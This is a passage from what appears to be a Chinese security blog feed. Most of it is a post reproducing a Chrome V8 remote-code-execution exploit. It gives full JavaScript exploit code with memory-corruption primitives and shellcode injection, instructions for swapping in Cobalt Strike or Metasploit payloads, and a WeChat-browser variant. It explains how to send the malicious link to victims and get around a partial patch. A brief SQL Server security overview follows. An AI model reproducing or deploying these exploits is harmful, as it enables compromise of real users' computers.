&#x3D; Math.max(x, 0);</span><br><span class="line"></span><br><span class="line">x -&#x3D; 1;</span><br><span class="line">if(x&#x3D;&#x3D;-1) x &#x3D; 0;</span><br><span class="line"></span><br><span class="line">var arr &#x3D; new Array(x);</span><br><span class="line">arr.shift();</span><br><span class="line">var cor &#x3D; [1.1, 1.2, 1.3];</span><br><span class="line"></span><br><span class="line">return [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i&#x3D;0;i&lt;0x3000;++i)</span><br><span class="line">    foo(true);</span><br><span class="line"></span><br><span class="line">var x &#x3D; foo(false);</span><br><span class="line">var arr &#x3D; x[0];</span><br><span class="line">var cor &#x3D; x[1];</span><br><span class="line"></span><br><span class="line">const idx &#x3D; 6;</span><br><span class="line">arr[idx+10] &#x3D; 0x4242;</span><br><span class="line"></span><br><span class="line">function addrof(k) &#123;</span><br><span class="line">    arr[idx+1] &#x3D; k;</span><br><span class="line">    return ftoi(cor[0]) &amp; 0xffffffffn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeobj(k) &#123;</span><br><span class="line">    cor[0] &#x3D; itof(k);</span><br><span class="line">    return arr[idx+1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var float_array_map &#x3D; ftoi(cor[3]);</span><br><span class="line"></span><br><span class="line">var arr2 &#x3D; [itof(float_array_map), 1.2, 2.3, 3.4];</span><br><span class="line">var fake &#x3D; fakeobj(addrof(arr2) + 0x20n);</span><br><span class="line"></span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % 2n &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        addr +&#x3D; 1n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[1] &#x3D; itof((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    return (fake[0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % 2n &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        addr +&#x3D; 1n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[1] &#x3D; itof((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    fake[0] &#x3D; itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copy_shellcode(addr, shellcode) &#123;</span><br><span class="line">    let dataview &#x3D; new DataView(buf2);</span><br><span class="line">    let buf_addr &#x3D; addrof(buf2);</span><br><span class="line">    let backing_store_addr &#x3D; buf_addr + 0x14n;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rwx_page_addr &#x3D; ftoi(arbread(addrof(wasm_instance) + 0x68n));</span><br><span class="line">console.log(&quot;[+] Address of rwx page: &quot; + rwx_page_addr.toString(16));</span><br><span class="line">var shellcode &#x3D; [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-14.png"></p><p>上边的POC只是单纯验证弹出计算器，如果想要上线到CS/MSF得用下边这个EXP，在CS或MSF中生成一个64位的C Payload（C#则无需替换），然后将里边的shellcode（这里选择CS上线）提取出来并将其中的<code>\</code>替换为<code> ,0</code>放到exploit2.html文件中即可。</p><ul><li><p>CS监听端口（随自己选择）<br><img src="/images/pasted-16.png"></p></li><li><p>生成payload<br><img src="/images/pasted-17.png"></p></li><li><p>替换payload，将其中的<code>\</code>替换为<code> ,0</code><br><img src="/images/pasted-18.png"><br><img src="/images/pasted-19.png"></p></li><li><p>取出替换后的shellcode，放入以下html的shellcode中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;chrome test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;test&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   function gc() &#123;</span><br><span class="line">       for (var i &#x3D; 0; i &lt; 0x80000; ++i) &#123;</span><br><span class="line">           var a &#x3D; new ArrayBuffer();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   let shellcode &#x3D; [];</span><br><span class="line">   var wasmCode &#x3D; new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);</span><br><span class="line">   var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">   var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule);</span><br><span class="line">   var main &#x3D; wasmInstance.exports.main;</span><br><span class="line">   var bf &#x3D; new ArrayBuffer(8);</span><br><span class="line">   var bfView &#x3D; new DataView(bf);</span><br><span class="line">   function fLow(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return (bfView.getUint32(0, true));</span><br><span class="line">  &#125;</span><br><span class="line">   function fHi(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return (bfView.getUint32(4, true))</span><br><span class="line">  &#125;</span><br><span class="line">   function i2f(low, hi) &#123;</span><br><span class="line">       bfView.setUint32(0, low, true);</span><br><span class="line">       bfView.setUint32(4, hi, true);</span><br><span class="line">       return bfView.getFloat64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   function f2big(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return bfView.getBigUint64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   function big2f(b) &#123;</span><br><span class="line">       bfView.setBigUint64(0, b, true);</span><br><span class="line">       return bfView.getFloat64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">       constructor(size) &#123;</span><br><span class="line">           super(size);</span><br><span class="line">           this.slot &#x3D; 0xb33f;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   function foo(a) &#123;</span><br><span class="line">       let x &#x3D; -1;</span><br><span class="line">       if (a) x &#x3D; 0xFFFFFFFF;</span><br><span class="line">       var arr &#x3D; new Array(Math.sign(0 - Math.max(0, x, -1)));</span><br><span class="line">       arr.shift();</span><br><span class="line">       let local_arr &#x3D; Array(2);</span><br><span class="line">       local_arr[0] &#x3D; 5.1;&#x2F;&#x2F;4014666666666666</span><br><span class="line">       let buff &#x3D; new LeakArrayBuffer(0x1000);&#x2F;&#x2F;byteLength idx&#x3D;8</span><br><span class="line">       arr[0] &#x3D; 0x1122;</span><br><span class="line">       return [arr, local_arr, buff];</span><br><span class="line">  &#125;</span><br><span class="line">   for (var i &#x3D; 0; i &lt; 0x10000; ++i)</span><br><span class="line">       foo(false);</span><br><span class="line">   gc(); gc();</span><br><span class="line">  [corrput_arr, rwarr, corrupt_buff] &#x3D; foo(true);</span><br><span class="line">   corrput_arr[12] &#x3D; 0x22444;</span><br><span class="line">   delete corrput_arr;</span><br><span class="line">   function setbackingStore(hi, low) &#123;</span><br><span class="line">       rwarr[4] &#x3D; i2f(fLow(rwarr[4]), hi);</span><br><span class="line">       rwarr[5] &#x3D; i2f(low, fHi(rwarr[5]));</span><br><span class="line">  &#125;</span><br><span class="line">   function leakObjLow(o) &#123;</span><br><span class="line">       corrupt_buff.slot &#x3D; o;</span><br><span class="line">       return (fLow(rwarr[9]) - 1);</span><br><span class="line">  &#125;</span><br><span class="line">   let corrupt_view &#x3D; new DataView(corrupt_buff);</span><br><span class="line">   let corrupt_buffer_ptr_low &#x3D; leakObjLow(corrupt_buff);</span><br><span class="line">   let idx0Addr &#x3D; corrupt_buffer_ptr_low - 0x10;</span><br><span class="line">   let baseAddr &#x3D; (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</span><br><span class="line">   let delta &#x3D; baseAddr + 0x1c - idx0Addr;</span><br><span class="line">   if ((delta % 8) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">       let baseIdx &#x3D; delta &#x2F; 8;</span><br><span class="line">       this.base &#x3D; fLow(rwarr[baseIdx]);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">       let baseIdx &#x3D; ((delta - (delta % 8)) &#x2F; 8);</span><br><span class="line">       this.base &#x3D; fHi(rwarr[baseIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">   let wasmInsAddr &#x3D; leakObjLow(wasmInstance);</span><br><span class="line">   setbackingStore(wasmInsAddr, this.base);</span><br><span class="line">   let code_entry &#x3D; corrupt_view.getFloat64(13 * 8, true);</span><br><span class="line">   setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">   for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">       corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">  &#125;</span><br><span class="line">   main();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-20.png"></p></li><li><p>-no-sandbox 参数 关闭沙箱，在chrome浏览器打开exploit2.html， CS 上线<br><img src="/images/pasted-22.png"><br><img src="/images/pasted-21.png"><br>关闭该页面会话即断开，建议在上线后执行进程迁移。</p></li></ul><hr><h2 id="微信CS上线复现"><a href="#微信CS上线复现" class="headerlink" title="微信CS上线复现"></a>微信CS上线复现</h2><p>微信内置浏览器使用Chrome内核，且默认关闭沙盒–no-sandbox，所以可以直接利用Chrome远程代码执行漏洞，黑客只需要通过微信发送一个特制Web链接，用户一旦点击链接，微信PC Windows版进程wechatweb.exe会加载shellcode执行，整个过程无文件落地，无新进程产生。<br>可以访问一下链接来查看微信内置chrome浏览器的版本：</p><ul><li><a href="https://wuchendi.gitee.io/chrome/index.html">https://wuchendi.gitee.io/chrome/index.html</a><br><img src="/images/pasted-25.png"><br><img src="/images/pasted-26.png"></li><li>微信的利用方式与Chrome差不多，就不再详细写具体步骤了，只需要将以下EXP中的第5行shellcode替换为我们CS或MSF生成的32位C# Payload即可。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">ENABLE_LOG &#x3D; true;</span><br><span class="line">IN_WORKER &#x3D; true;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; run calc and hang in a loop</span><br><span class="line">var shellcode &#x3D; [  ];</span><br><span class="line"></span><br><span class="line">function print(data) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var not_optimised_out &#x3D; 0;</span><br><span class="line">var target_function &#x3D; (function (value) &#123;</span><br><span class="line">    if (value &#x3D;&#x3D; 0xdecaf0) &#123;</span><br><span class="line">        not_optimised_out +&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out +&#x3D; 1;</span><br><span class="line">    not_optimised_out |&#x3D; 0xff;</span><br><span class="line">    not_optimised_out *&#x3D; 12;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var g_array;</span><br><span class="line">var tDerivedNCount &#x3D; 17 * 87481 - 8;</span><br><span class="line">var tDerivedNDepth &#x3D; 19 * 19;</span><br><span class="line"></span><br><span class="line">function cb(flag) &#123;</span><br><span class="line">    if (flag &#x3D;&#x3D; true) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array &#x3D; new Array(0);</span><br><span class="line">    g_array[0] &#x3D; 0x1dbabe * 2;</span><br><span class="line">    return &#39;c01db33f&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function gc() &#123;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function oobAccess() &#123;</span><br><span class="line">    var this_ &#x3D; this;</span><br><span class="line">    this.buffer &#x3D; null;</span><br><span class="line">    this.buffer_view &#x3D; null;</span><br><span class="line"></span><br><span class="line">    this.page_buffer &#x3D; null;</span><br><span class="line">    this.page_view &#x3D; null;</span><br><span class="line"></span><br><span class="line">    this.prevent_opt &#x3D; [];</span><br><span class="line"></span><br><span class="line">    var kSlotOffset &#x3D; 0x1f;</span><br><span class="line">    var kBackingStoreOffset &#x3D; 0xf;</span><br><span class="line"></span><br><span class="line">    class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">        constructor() &#123;</span><br><span class="line">            super(0x1000);</span><br><span class="line">            this.slot &#x3D; this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.page_buffer &#x3D; new LeakArrayBuffer();</span><br><span class="line">    this.page_view &#x3D; new DataView(this.page_buffer);</span><br><span class="line"></span><br><span class="line">    new RegExp(&#123; toString: function () &#123; return &#39;a&#39; &#125; &#125;);</span><br><span class="line">    cb(true);</span><br><span class="line"></span><br><span class="line">    class DerivedBase extends RegExp &#123;</span><br><span class="line">        constructor() &#123;</span><br><span class="line">            &#x2F;&#x2F; var array &#x3D; null;</span><br><span class="line">            super(</span><br><span class="line">                &#x2F;&#x2F; at this point, the 4-byte allocation for the JSRegExp &#96;this&#96; object</span><br><span class="line">                &#x2F;&#x2F; has just happened.</span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, &#39;g&#39;</span><br><span class="line">                &#x2F;&#x2F; now the runtime JSRegExp constructor is called, corrupting the</span><br><span class="line">                &#x2F;&#x2F; JSArray.</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; this allocation will now directly follow the FixedArray allocation</span><br><span class="line">            &#x2F;&#x2F; made for &#96;this.data&#96;, which is where &#96;array.elements&#96; points to.</span><br><span class="line">            this_.buffer &#x3D; new ArrayBuffer(0x80);</span><br><span class="line">            g_array[8] &#x3D; this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; try&#123;</span><br><span class="line">    var derived_n &#x3D; eval(&#96;(function derived_n(i) &#123;</span><br><span class="line">        if (i &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return DerivedBase;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        class DerivedN extends derived_n(i-1) &#123;</span><br><span class="line">            constructor() &#123;</span><br><span class="line">                super();</span><br><span class="line">                return;</span><br><span class="line">                $&#123;&quot;this.a&#x3D;0;&quot;.repeat(tDerivedNCount)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return DerivedN;</span><br><span class="line">    &#125;)&#96;);</span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line">    new (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line">    this.buffer_view &#x3D; new DataView(this.buffer);</span><br><span class="line">    this.leakPtr &#x3D; function (obj) &#123;</span><br><span class="line">        this.page_buffer.slot &#x3D; obj;</span><br><span class="line">        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.setPtr &#x3D; function (addr) &#123;</span><br><span class="line">        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.read32 &#x3D; function (addr) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        return this.page_view.getUint32(0, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.write32 &#x3D; function (addr, value) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        this.page_view.setUint32(0, value, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.write8 &#x3D; function (addr, value) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        this.page_view.setUint8(0, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.setBytes &#x3D; function (addr, content) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; content.length; i++) &#123;</span><br><span class="line">            this.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function trigger() &#123;</span><br><span class="line">    var oob &#x3D; oobAccess();</span><br><span class="line"></span><br><span class="line">    var func_ptr &#x3D; oob.leakPtr(target_function);</span><br><span class="line">    print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16));</span><br><span class="line"></span><br><span class="line">    var kCodeInsOffset &#x3D; 0x1b;</span><br><span class="line"></span><br><span class="line">    var code_addr &#x3D; oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16));</span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line">    target_function(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    print(&quot;start running&quot;);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-23.png"></p><ul><li>然后通过微信将我们的恶意链接发给对方，等待他点击该链接后即可成功得到目标主机会话。<br>  <img src="/images/pasted-27.png"><br>  <img src="/images/pasted-24.png"></li><li>tips<ul><li>对于微信4.2.1.143版本，这是爆出漏洞后的第一次更新，临时关闭了微信内置浏览器，采取白名单方式进行验证，仅允许*.weixin.qq.com白名单域名通过内置浏览器打开，但是依旧没有开启沙盒，所以我们还可以通过公众号的阅读原文等方式来访问恶意链接上线CS/MSF。</li><li>对于微信4.2.1.151版本，这是爆出漏洞后的第二次更新，基本上已经完全修复了这个漏洞，升级了微信版本、暂时不用wechatweb.exe做为内置浏览器（不过文件还在，说不定还会用）、删除禁用沙盒–no-sandbox参数等，目前在线升级只能到143，151需要通过官网下载。</li></ul></li></ul><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>升级Chrome浏览器为最新版本（90.0.4430.72）</li><li>升级Windows微信为最新版本（3.2.1.151）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 远程代码执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信 </tag>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防演练-SQL Server数据库安全</title>
      <link href="2021/04/21/Web%E5%AE%89%E5%85%A8-SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
      <url>2021/04/21/Web%E5%AE%89%E5%85%A8-SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-Server数据库安全"><a href="#SQL-Server数据库安全" class="headerlink" title="SQL Server数据库安全"></a>SQL Server数据库安全</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在网络安全实战攻防演练中，办公应用系统、Web中间件，数据库等是攻击方主要的攻击对象，由于使用量最大，数据库往往会成为攻击者的 首选目标之一。以微软SQL Server为例，除了常见的SQL注入漏洞，攻击方还会用一些“出其不意”的招式，将SQL Server原本的优势转变为攻击的突破口，比如在相应的权限下，攻击者可以利用SQL Server 强大的存储过程执行不同的高级功能，通过增加SQL Server数据库用户，权限维持等方式，攻击用户数据库系统，下文将详述攻击方那些“不常见”的数据库攻击手段以及防守方的应对思路。</p><hr><h2 id="SQL-Server概述"><a href="#SQL-Server概述" class="headerlink" title="SQL Server概述"></a>SQL Server概述</h2><p>SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。这意味着可以在Mac上运行SQL Server。<br>SQL Server的可用版本</p><table><thead><tr><th>版本</th><th>描述</th></tr></thead><tbody><tr><td>Enterprise Edition</td><td>此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。</td></tr><tr><td>Standard Edition</td><td>该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。</td></tr><tr><td>Personal Edition</td><td>它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。</td></tr><tr><td>Developer Edition</td><td>面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。</td></tr></tbody></table><hr><h2 id="客户端-服务器数据库系统"><a href="#客户端-服务器数据库系统" class="headerlink" title="客户端/服务器数据库系统"></a>客户端/服务器数据库系统</h2><p>SQL Server是一个客户端/服务器数据库管理系统（DBMS）。这允许有许多不同的客户端同时，全部连接到SQL Server。这些客户端的每一个都可以通过不同的工具进行连接。<br>例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。</p><p>客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。</p><p>SQL Server是在服务帐户的上下文中在操作系统上运行的一组Windows服务。每次安装SQL Server实例时，实际上都会安装一组Windows服务并具有唯一的名称。现有的SQL Server帐户类型：</p><ul><li>Windows帐户。</li><li>SQL Server登录名（SQL Server内部）。</li><li>数据库用户（SQL Server内部）。</li></ul><p>Windows帐户和SQL Server登录名用于登录SQL Server。除非系统管理员，否则必须将SQL Server登录名映射到数据库用户才能访问数据。数据库用户是在数据库级别内单独创建的。<br>SQL Server的常见角色是：</p><ul><li>Sysadmin角色：SQL Server管理员。</li><li>Public角色：最低特权，类似于Windows中的everyone组。</li><li>更多请参考：<a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017</a></li></ul><hr><h2 id="TDS协议"><a href="#TDS协议" class="headerlink" title="TDS协议"></a>TDS协议</h2><p>表格数据流（Tabular Data Stream,TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软SQL 